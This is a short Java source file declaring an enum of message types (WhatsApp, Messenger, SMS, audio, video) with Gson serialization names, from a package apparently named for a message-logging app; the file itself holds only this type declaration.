package com.gravatasufoca.spylogger.model;

import com.google.gson.annotations.SerializedName;

/**
 * Created by bruno on 16/11/16.
 */

public enum TipoMensagem {
    @SerializedName("0")
    WHATSAPP,
    @SerializedName("1")
    MESSENGER,
    @SerializedName("2")
    SMS,
    @SerializedName("3")
    AUDIO,
    @SerializedName("4")
    VIDEO;
}
